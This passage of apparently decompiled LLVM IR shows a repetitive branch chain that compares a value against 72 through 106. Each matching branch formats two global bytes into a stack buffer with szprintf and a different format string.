  %v2_ba44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba50 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ba5c = load i8, i8* @global_var_324e2.76, align 1
  %v4_ba68 = sext i8 %v3_ba50 to i32
  %v6_ba68 = sext i8 %v3_ba5c to i32
  %v8_ba68 = call i32 @szprintf(i32 %v2_ba44, i32 ptrtoint ([13 x i8]* @global_var_23ea8.219 to i32), i32 %v4_ba68, i32 %v6_ba68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba6c

dec_label_pc_ba6c:                                ; preds = %dec_label_pc_ba38, %dec_label_pc_ba44
  %v7_ba70 = icmp eq i32 %v2_a95c, 72
  br i1 %v7_ba70, label %dec_label_pc_ba78, label %dec_label_pc_baa0

dec_label_pc_ba78:                                ; preds = %dec_label_pc_ba6c
  %v2_ba78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ba84 = load i8, i8* @global_var_324e1.75, align 1
  %v3_ba90 = load i8, i8* @global_var_324e2.76, align 1
  %v4_ba9c = sext i8 %v3_ba84 to i32
  %v6_ba9c = sext i8 %v3_ba90 to i32
  %v8_ba9c = call i32 @szprintf(i32 %v2_ba78, i32 ptrtoint ([13 x i8]* @global_var_23eb8.221 to i32), i32 %v4_ba9c, i32 %v6_ba9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_baa0

dec_label_pc_baa0:                                ; preds = %dec_label_pc_ba6c, %dec_label_pc_ba78
  %v7_baa4 = icmp eq i32 %v2_a95c, 73
  br i1 %v7_baa4, label %dec_label_pc_baac, label %dec_label_pc_bad4

dec_label_pc_baac:                                ; preds = %dec_label_pc_baa0
  %v2_baac = ptrtoint i32* %stack_var_-36 to i32
  %v3_bab8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bac4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bad0 = sext i8 %v3_bab8 to i32
  %v6_bad0 = sext i8 %v3_bac4 to i32
  %v8_bad0 = call i32 @szprintf(i32 %v2_baac, i32 ptrtoint ([13 x i8]* @global_var_23ec8.223 to i32), i32 %v4_bad0, i32 %v6_bad0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bad4

dec_label_pc_bad4:                                ; preds = %dec_label_pc_baa0, %dec_label_pc_baac
  %v7_bad8 = icmp eq i32 %v2_a95c, 74
  br i1 %v7_bad8, label %dec_label_pc_bae0, label %dec_label_pc_bb08

dec_label_pc_bae0:                                ; preds = %dec_label_pc_bad4
  %v2_bae0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_baec = load i8, i8* @global_var_324e1.75, align 1
  %v3_baf8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bb04 = sext i8 %v3_baec to i32
  %v6_bb04 = sext i8 %v3_baf8 to i32
  %v8_bb04 = call i32 @szprintf(i32 %v2_bae0, i32 ptrtoint ([13 x i8]* @global_var_23ed8.225 to i32), i32 %v4_bb04, i32 %v6_bb04, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb08

dec_label_pc_bb08:                                ; preds = %dec_label_pc_bad4, %dec_label_pc_bae0
  %v7_bb0c = icmp eq i32 %v2_a95c, 75
  br i1 %v7_bb0c, label %dec_label_pc_bb14, label %dec_label_pc_bb3c

dec_label_pc_bb14:                                ; preds = %dec_label_pc_bb08
  %v2_bb14 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb20 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bb2c = load i8, i8* @global_var_324e2.76, align 1
  %v4_bb38 = sext i8 %v3_bb20 to i32
  %v6_bb38 = sext i8 %v3_bb2c to i32
  %v8_bb38 = call i32 @szprintf(i32 %v2_bb14, i32 ptrtoint ([13 x i8]* @global_var_23ee8.227 to i32), i32 %v4_bb38, i32 %v6_bb38, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb08, %dec_label_pc_bb14
  %v7_bb40 = icmp eq i32 %v2_a95c, 76
  br i1 %v7_bb40, label %dec_label_pc_bb48, label %dec_label_pc_bb70

dec_label_pc_bb48:                                ; preds = %dec_label_pc_bb3c
  %v2_bb48 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb54 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bb60 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bb6c = sext i8 %v3_bb54 to i32
  %v6_bb6c = sext i8 %v3_bb60 to i32
  %v8_bb6c = call i32 @szprintf(i32 %v2_bb48, i32 ptrtoint ([13 x i8]* @global_var_23ef8.229 to i32), i32 %v4_bb6c, i32 %v6_bb6c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb70

dec_label_pc_bb70:                                ; preds = %dec_label_pc_bb3c, %dec_label_pc_bb48
  %v7_bb74 = icmp eq i32 %v2_a95c, 77
  br i1 %v7_bb74, label %dec_label_pc_bb7c, label %dec_label_pc_bba4

dec_label_pc_bb7c:                                ; preds = %dec_label_pc_bb70
  %v2_bb7c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bb88 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bb94 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bba0 = sext i8 %v3_bb88 to i32
  %v6_bba0 = sext i8 %v3_bb94 to i32
  %v8_bba0 = call i32 @szprintf(i32 %v2_bb7c, i32 ptrtoint ([13 x i8]* @global_var_23f08.231 to i32), i32 %v4_bba0, i32 %v6_bba0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bba4

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bb70, %dec_label_pc_bb7c
  %v7_bba8 = icmp eq i32 %v2_a95c, 78
  br i1 %v7_bba8, label %dec_label_pc_bbb0, label %dec_label_pc_bbd8

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bba4
  %v2_bbb0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbbc = load i8, i8* @global_var_324e1.75, align 1
  %v3_bbc8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bbd4 = sext i8 %v3_bbbc to i32
  %v6_bbd4 = sext i8 %v3_bbc8 to i32
  %v8_bbd4 = call i32 @szprintf(i32 %v2_bbb0, i32 ptrtoint ([13 x i8]* @global_var_23f18.233 to i32), i32 %v4_bbd4, i32 %v6_bbd4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bba4, %dec_label_pc_bbb0
  %v7_bbdc = icmp eq i32 %v2_a95c, 79
  br i1 %v7_bbdc, label %dec_label_pc_bbe4, label %dec_label_pc_bc0c

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bbd8
  %v2_bbe4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bbf0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bbfc = load i8, i8* @global_var_324e2.76, align 1
  %v4_bc08 = sext i8 %v3_bbf0 to i32
  %v6_bc08 = sext i8 %v3_bbfc to i32
  %v8_bc08 = call i32 @szprintf(i32 %v2_bbe4, i32 ptrtoint ([13 x i8]* @global_var_23f28.235 to i32), i32 %v4_bc08, i32 %v6_bc08, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc0c

dec_label_pc_bc0c:                                ; preds = %dec_label_pc_bbd8, %dec_label_pc_bbe4
  %v7_bc10 = icmp eq i32 %v2_a95c, 80
  br i1 %v7_bc10, label %dec_label_pc_bc18, label %dec_label_pc_bc40

dec_label_pc_bc18:                                ; preds = %dec_label_pc_bc0c
  %v2_bc18 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc24 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bc30 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bc3c = sext i8 %v3_bc24 to i32
  %v6_bc3c = sext i8 %v3_bc30 to i32
  %v8_bc3c = call i32 @szprintf(i32 %v2_bc18, i32 ptrtoint ([13 x i8]* @global_var_23f38.237 to i32), i32 %v4_bc3c, i32 %v6_bc3c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc40

dec_label_pc_bc40:                                ; preds = %dec_label_pc_bc0c, %dec_label_pc_bc18
  %v7_bc44 = icmp eq i32 %v2_a95c, 81
  br i1 %v7_bc44, label %dec_label_pc_bc4c, label %dec_label_pc_bc74

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_bc40
  %v2_bc4c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc58 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bc64 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bc70 = sext i8 %v3_bc58 to i32
  %v6_bc70 = sext i8 %v3_bc64 to i32
  %v8_bc70 = call i32 @szprintf(i32 %v2_bc4c, i32 ptrtoint ([13 x i8]* @global_var_23f48.239 to i32), i32 %v4_bc70, i32 %v6_bc70, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc74

dec_label_pc_bc74:                                ; preds = %dec_label_pc_bc40, %dec_label_pc_bc4c
  %v7_bc78 = icmp eq i32 %v2_a95c, 82
  br i1 %v7_bc78, label %dec_label_pc_bc80, label %dec_label_pc_bca8

dec_label_pc_bc80:                                ; preds = %dec_label_pc_bc74
  %v2_bc80 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bc8c = load i8, i8* @global_var_324e1.75, align 1
  %v3_bc98 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bca4 = sext i8 %v3_bc8c to i32
  %v6_bca4 = sext i8 %v3_bc98 to i32
  %v8_bca4 = call i32 @szprintf(i32 %v2_bc80, i32 ptrtoint ([13 x i8]* @global_var_23f58.241 to i32), i32 %v4_bca4, i32 %v6_bca4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bca8

dec_label_pc_bca8:                                ; preds = %dec_label_pc_bc74, %dec_label_pc_bc80
  %v7_bcac = icmp eq i32 %v2_a95c, 83
  br i1 %v7_bcac, label %dec_label_pc_bcb4, label %dec_label_pc_bcdc

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bca8
  %v2_bcb4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bcc0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bccc = load i8, i8* @global_var_324e2.76, align 1
  %v4_bcd8 = sext i8 %v3_bcc0 to i32
  %v6_bcd8 = sext i8 %v3_bccc to i32
  %v8_bcd8 = call i32 @szprintf(i32 %v2_bcb4, i32 ptrtoint ([13 x i8]* @global_var_23f68.243 to i32), i32 %v4_bcd8, i32 %v6_bcd8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcdc

dec_label_pc_bcdc:                                ; preds = %dec_label_pc_bca8, %dec_label_pc_bcb4
  %v7_bce0 = icmp eq i32 %v2_a95c, 84
  br i1 %v7_bce0, label %dec_label_pc_bce8, label %dec_label_pc_bd10

dec_label_pc_bce8:                                ; preds = %dec_label_pc_bcdc
  %v2_bce8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bcf4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bd00 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bd0c = sext i8 %v3_bcf4 to i32
  %v6_bd0c = sext i8 %v3_bd00 to i32
  %v8_bd0c = call i32 @szprintf(i32 %v2_bce8, i32 ptrtoint ([13 x i8]* @global_var_23f78.245 to i32), i32 %v4_bd0c, i32 %v6_bd0c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd10

dec_label_pc_bd10:                                ; preds = %dec_label_pc_bcdc, %dec_label_pc_bce8
  %v7_bd14 = icmp eq i32 %v2_a95c, 85
  br i1 %v7_bd14, label %dec_label_pc_bd1c, label %dec_label_pc_bd44

dec_label_pc_bd1c:                                ; preds = %dec_label_pc_bd10
  %v2_bd1c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd28 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bd34 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bd40 = sext i8 %v3_bd28 to i32
  %v6_bd40 = sext i8 %v3_bd34 to i32
  %v8_bd40 = call i32 @szprintf(i32 %v2_bd1c, i32 ptrtoint ([13 x i8]* @global_var_23f88.247 to i32), i32 %v4_bd40, i32 %v6_bd40, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd44

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd10, %dec_label_pc_bd1c
  %v7_bd48 = icmp eq i32 %v2_a95c, 86
  br i1 %v7_bd48, label %dec_label_pc_bd50, label %dec_label_pc_bd78

dec_label_pc_bd50:                                ; preds = %dec_label_pc_bd44
  %v2_bd50 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd5c = load i8, i8* @global_var_324e1.75, align 1
  %v3_bd68 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bd74 = sext i8 %v3_bd5c to i32
  %v6_bd74 = sext i8 %v3_bd68 to i32
  %v8_bd74 = call i32 @szprintf(i32 %v2_bd50, i32 ptrtoint ([13 x i8]* @global_var_23f98.249 to i32), i32 %v4_bd74, i32 %v6_bd74, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd78

dec_label_pc_bd78:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bd50
  %v7_bd7c = icmp eq i32 %v2_a95c, 87
  br i1 %v7_bd7c, label %dec_label_pc_bd84, label %dec_label_pc_bdac

dec_label_pc_bd84:                                ; preds = %dec_label_pc_bd78
  %v2_bd84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bd90 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bd9c = load i8, i8* @global_var_324e2.76, align 1
  %v4_bda8 = sext i8 %v3_bd90 to i32
  %v6_bda8 = sext i8 %v3_bd9c to i32
  %v8_bda8 = call i32 @szprintf(i32 %v2_bd84, i32 ptrtoint ([13 x i8]* @global_var_23fa8.251 to i32), i32 %v4_bda8, i32 %v6_bda8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdac

dec_label_pc_bdac:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bd84
  %v7_bdb0 = icmp eq i32 %v2_a95c, 88
  br i1 %v7_bdb0, label %dec_label_pc_bdb8, label %dec_label_pc_bde0

dec_label_pc_bdb8:                                ; preds = %dec_label_pc_bdac
  %v2_bdb8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdc4 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bdd0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bddc = sext i8 %v3_bdc4 to i32
  %v6_bddc = sext i8 %v3_bdd0 to i32
  %v8_bddc = call i32 @szprintf(i32 %v2_bdb8, i32 ptrtoint ([13 x i8]* @global_var_23fb8.253 to i32), i32 %v4_bddc, i32 %v6_bddc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bde0

dec_label_pc_bde0:                                ; preds = %dec_label_pc_bdac, %dec_label_pc_bdb8
  %v7_bde4 = icmp eq i32 %v2_a95c, 89
  br i1 %v7_bde4, label %dec_label_pc_bdec, label %dec_label_pc_be14

dec_label_pc_bdec:                                ; preds = %dec_label_pc_bde0
  %v2_bdec = ptrtoint i32* %stack_var_-36 to i32
  %v3_bdf8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_be04 = load i8, i8* @global_var_324e2.76, align 1
  %v4_be10 = sext i8 %v3_bdf8 to i32
  %v6_be10 = sext i8 %v3_be04 to i32
  %v8_be10 = call i32 @szprintf(i32 %v2_bdec, i32 ptrtoint ([13 x i8]* @global_var_23fc8.255 to i32), i32 %v4_be10, i32 %v6_be10, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be14

dec_label_pc_be14:                                ; preds = %dec_label_pc_bde0, %dec_label_pc_bdec
  %v7_be18 = icmp eq i32 %v2_a95c, 90
  br i1 %v7_be18, label %dec_label_pc_be20, label %dec_label_pc_be48

dec_label_pc_be20:                                ; preds = %dec_label_pc_be14
  %v2_be20 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be2c = load i8, i8* @global_var_324e1.75, align 1
  %v3_be38 = load i8, i8* @global_var_324e2.76, align 1
  %v4_be44 = sext i8 %v3_be2c to i32
  %v6_be44 = sext i8 %v3_be38 to i32
  %v8_be44 = call i32 @szprintf(i32 %v2_be20, i32 ptrtoint ([13 x i8]* @global_var_23fd8.257 to i32), i32 %v4_be44, i32 %v6_be44, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be48

dec_label_pc_be48:                                ; preds = %dec_label_pc_be14, %dec_label_pc_be20
  %v7_be4c = icmp eq i32 %v2_a95c, 91
  br i1 %v7_be4c, label %dec_label_pc_be54, label %dec_label_pc_be7c

dec_label_pc_be54:                                ; preds = %dec_label_pc_be48
  %v2_be54 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be60 = load i8, i8* @global_var_324e1.75, align 1
  %v3_be6c = load i8, i8* @global_var_324e2.76, align 1
  %v4_be78 = sext i8 %v3_be60 to i32
  %v6_be78 = sext i8 %v3_be6c to i32
  %v8_be78 = call i32 @szprintf(i32 %v2_be54, i32 ptrtoint ([13 x i8]* @global_var_23fe8.259 to i32), i32 %v4_be78, i32 %v6_be78, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_be7c

dec_label_pc_be7c:                                ; preds = %dec_label_pc_be48, %dec_label_pc_be54
  %v7_be80 = icmp eq i32 %v2_a95c, 92
  br i1 %v7_be80, label %dec_label_pc_be88, label %dec_label_pc_beb0

dec_label_pc_be88:                                ; preds = %dec_label_pc_be7c
  %v2_be88 = ptrtoint i32* %stack_var_-36 to i32
  %v3_be94 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bea0 = load i8, i8* @global_var_324e2.76, align 1
  %v4_beac = sext i8 %v3_be94 to i32
  %v6_beac = sext i8 %v3_bea0 to i32
  %v8_beac = call i32 @szprintf(i32 %v2_be88, i32 ptrtoint ([13 x i8]* @global_var_23ff8.261 to i32), i32 %v4_beac, i32 %v6_beac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_beb0

dec_label_pc_beb0:                                ; preds = %dec_label_pc_be7c, %dec_label_pc_be88
  %v7_beb4 = icmp eq i32 %v2_a95c, 93
  br i1 %v7_beb4, label %dec_label_pc_bebc, label %dec_label_pc_bee4

dec_label_pc_bebc:                                ; preds = %dec_label_pc_beb0
  %v2_bebc = ptrtoint i32* %stack_var_-36 to i32
  %v3_bec8 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bed4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bee0 = sext i8 %v3_bec8 to i32
  %v6_bee0 = sext i8 %v3_bed4 to i32
  %v8_bee0 = call i32 @szprintf(i32 %v2_bebc, i32 ptrtoint ([13 x i8]* @global_var_24008.263 to i32), i32 %v4_bee0, i32 %v6_bee0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bee4

dec_label_pc_bee4:                                ; preds = %dec_label_pc_beb0, %dec_label_pc_bebc
  %v7_bee8 = icmp eq i32 %v2_a95c, 94
  br i1 %v7_bee8, label %dec_label_pc_bef0, label %dec_label_pc_bf18

dec_label_pc_bef0:                                ; preds = %dec_label_pc_bee4
  %v2_bef0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_befc = load i8, i8* @global_var_324e1.75, align 1
  %v3_bf08 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bf14 = sext i8 %v3_befc to i32
  %v6_bf14 = sext i8 %v3_bf08 to i32
  %v8_bf14 = call i32 @szprintf(i32 %v2_bef0, i32 ptrtoint ([13 x i8]* @global_var_23ce8.162 to i32), i32 %v4_bf14, i32 %v6_bf14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf18

dec_label_pc_bf18:                                ; preds = %dec_label_pc_bee4, %dec_label_pc_bef0
  %v7_bf1c = icmp eq i32 %v2_a95c, 95
  br i1 %v7_bf1c, label %dec_label_pc_bf24, label %dec_label_pc_bf4c

dec_label_pc_bf24:                                ; preds = %dec_label_pc_bf18
  %v2_bf24 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf30 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bf3c = load i8, i8* @global_var_324e2.76, align 1
  %v4_bf48 = sext i8 %v3_bf30 to i32
  %v6_bf48 = sext i8 %v3_bf3c to i32
  %v8_bf48 = call i32 @szprintf(i32 %v2_bf24, i32 ptrtoint ([13 x i8]* @global_var_24018.265 to i32), i32 %v4_bf48, i32 %v6_bf48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf4c

dec_label_pc_bf4c:                                ; preds = %dec_label_pc_bf18, %dec_label_pc_bf24
  %v7_bf50 = icmp eq i32 %v2_a95c, 96
  br i1 %v7_bf50, label %dec_label_pc_bf58, label %dec_label_pc_bf80

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf4c
  %v2_bf58 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf64 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bf70 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bf7c = sext i8 %v3_bf64 to i32
  %v6_bf7c = sext i8 %v3_bf70 to i32
  %v8_bf7c = call i32 @szprintf(i32 %v2_bf58, i32 ptrtoint ([13 x i8]* @global_var_23d18.168 to i32), i32 %v4_bf7c, i32 %v6_bf7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bf80

dec_label_pc_bf80:                                ; preds = %dec_label_pc_bf4c, %dec_label_pc_bf58
  %v7_bf84 = icmp eq i32 %v2_a95c, 97
  br i1 %v7_bf84, label %dec_label_pc_bf8c, label %dec_label_pc_bfb4

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_bf80
  %v2_bf8c = ptrtoint i32* %stack_var_-36 to i32
  %v3_bf98 = load i8, i8* @global_var_324e1.75, align 1
  %v3_bfa4 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bfb0 = sext i8 %v3_bf98 to i32
  %v6_bfb0 = sext i8 %v3_bfa4 to i32
  %v8_bfb0 = call i32 @szprintf(i32 %v2_bf8c, i32 ptrtoint ([13 x i8]* @global_var_24028.267 to i32), i32 %v4_bfb0, i32 %v6_bfb0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfb4

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bf80, %dec_label_pc_bf8c
  %v7_bfb8 = icmp eq i32 %v2_a95c, 98
  br i1 %v7_bfb8, label %dec_label_pc_bfc0, label %dec_label_pc_bfe8

dec_label_pc_bfc0:                                ; preds = %dec_label_pc_bfb4
  %v2_bfc0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_bfcc = load i8, i8* @global_var_324e1.75, align 1
  %v3_bfd8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_bfe4 = sext i8 %v3_bfcc to i32
  %v6_bfe4 = sext i8 %v3_bfd8 to i32
  %v8_bfe4 = call i32 @szprintf(i32 %v2_bfc0, i32 ptrtoint ([13 x i8]* @global_var_24038.269 to i32), i32 %v4_bfe4, i32 %v6_bfe4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bfe8

dec_label_pc_bfe8:                                ; preds = %dec_label_pc_bfb4, %dec_label_pc_bfc0
  %v7_bfec = icmp eq i32 %v2_a95c, 99
  br i1 %v7_bfec, label %dec_label_pc_bff4, label %dec_label_pc_c01c

dec_label_pc_bff4:                                ; preds = %dec_label_pc_bfe8
  %v2_bff4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c000 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c00c = load i8, i8* @global_var_324e2.76, align 1
  %v4_c018 = sext i8 %v3_c000 to i32
  %v6_c018 = sext i8 %v3_c00c to i32
  %v8_c018 = call i32 @szprintf(i32 %v2_bff4, i32 ptrtoint ([13 x i8]* @global_var_24048.271 to i32), i32 %v4_c018, i32 %v6_c018, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c01c

dec_label_pc_c01c:                                ; preds = %dec_label_pc_bfe8, %dec_label_pc_bff4
  %v7_c020 = icmp eq i32 %v2_a95c, 100
  br i1 %v7_c020, label %dec_label_pc_c028, label %dec_label_pc_c050

dec_label_pc_c028:                                ; preds = %dec_label_pc_c01c
  %v2_c028 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c034 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c040 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c04c = sext i8 %v3_c034 to i32
  %v6_c04c = sext i8 %v3_c040 to i32
  %v8_c04c = call i32 @szprintf(i32 %v2_c028, i32 ptrtoint ([13 x i8]* @global_var_24058.273 to i32), i32 %v4_c04c, i32 %v6_c04c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c050

dec_label_pc_c050:                                ; preds = %dec_label_pc_c01c, %dec_label_pc_c028
  %v7_c054 = icmp eq i32 %v2_a95c, 101
  br i1 %v7_c054, label %dec_label_pc_c05c, label %dec_label_pc_c084

dec_label_pc_c05c:                                ; preds = %dec_label_pc_c050
  %v2_c05c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c068 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c074 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c080 = sext i8 %v3_c068 to i32
  %v6_c080 = sext i8 %v3_c074 to i32
  %v8_c080 = call i32 @szprintf(i32 %v2_c05c, i32 ptrtoint ([13 x i8]* @global_var_24068.275 to i32), i32 %v4_c080, i32 %v6_c080, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c084

dec_label_pc_c084:                                ; preds = %dec_label_pc_c050, %dec_label_pc_c05c
  %v7_c088 = icmp eq i32 %v2_a95c, 102
  br i1 %v7_c088, label %dec_label_pc_c090, label %dec_label_pc_c0b8

dec_label_pc_c090:                                ; preds = %dec_label_pc_c084
  %v2_c090 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c09c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c0a8 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c0b4 = sext i8 %v3_c09c to i32
  %v6_c0b4 = sext i8 %v3_c0a8 to i32
  %v8_c0b4 = call i32 @szprintf(i32 %v2_c090, i32 ptrtoint ([12 x i8]* @global_var_24078.277 to i32), i32 %v4_c0b4, i32 %v6_c0b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0b8

dec_label_pc_c0b8:                                ; preds = %dec_label_pc_c084, %dec_label_pc_c090
  %v7_c0bc = icmp eq i32 %v2_a95c, 103
  br i1 %v7_c0bc, label %dec_label_pc_c0c4, label %dec_label_pc_c0ec

dec_label_pc_c0c4:                                ; preds = %dec_label_pc_c0b8
  %v2_c0c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c0d0 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c0dc = load i8, i8* @global_var_324e2.76, align 1
  %v4_c0e8 = sext i8 %v3_c0d0 to i32
  %v6_c0e8 = sext i8 %v3_c0dc to i32
  %v8_c0e8 = call i32 @szprintf(i32 %v2_c0c4, i32 ptrtoint ([13 x i8]* @global_var_24084.279 to i32), i32 %v4_c0e8, i32 %v6_c0e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c0ec

dec_label_pc_c0ec:                                ; preds = %dec_label_pc_c0b8, %dec_label_pc_c0c4
  %v7_c0f0 = icmp eq i32 %v2_a95c, 104
  br i1 %v7_c0f0, label %dec_label_pc_c0f8, label %dec_label_pc_c120

dec_label_pc_c0f8:                                ; preds = %dec_label_pc_c0ec
  %v2_c0f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c104 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c110 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c11c = sext i8 %v3_c104 to i32
  %v6_c11c = sext i8 %v3_c110 to i32
  %v8_c11c = call i32 @szprintf(i32 %v2_c0f8, i32 ptrtoint ([13 x i8]* @global_var_24094.281 to i32), i32 %v4_c11c, i32 %v6_c11c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c120

dec_label_pc_c120:                                ; preds = %dec_label_pc_c0ec, %dec_label_pc_c0f8
  %v7_c124 = icmp eq i32 %v2_a95c, 105
  br i1 %v7_c124, label %dec_label_pc_c12c, label %dec_label_pc_c154

dec_label_pc_c12c:                                ; preds = %dec_label_pc_c120
  %v2_c12c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c138 = load i8, i8* @global_var_324e1.75, align 1
  %v3_c144 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c150 = sext i8 %v3_c138 to i32
  %v6_c150 = sext i8 %v3_c144 to i32
  %v8_c150 = call i32 @szprintf(i32 %v2_c12c, i32 ptrtoint ([13 x i8]* @global_var_240a4.283 to i32), i32 %v4_c150, i32 %v6_c150, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c154

dec_label_pc_c154:                                ; preds = %dec_label_pc_c120, %dec_label_pc_c12c
  %v7_c158 = icmp eq i32 %v2_a95c, 106
  br i1 %v7_c158, label %dec_label_pc_c160, label %dec_label_pc_c188

dec_label_pc_c160:                                ; preds = %dec_label_pc_c154
  %v2_c160 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c16c = load i8, i8* @global_var_324e1.75, align 1
  %v3_c178 = load i8, i8* @global_var_324e2.76, align 1
  %v4_c184 = sext i8 %v3_c16c to i32
  %v6_c184 = sext i8 %v3_c178 to i32
  %v8_c184 = call i32 @szprintf(i32 %v2_c160, i32 ptrtoint ([12 x i8]* @global_var_240b4.285 to i32), i32 %v4_c184, i32 %v6_c184, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c188

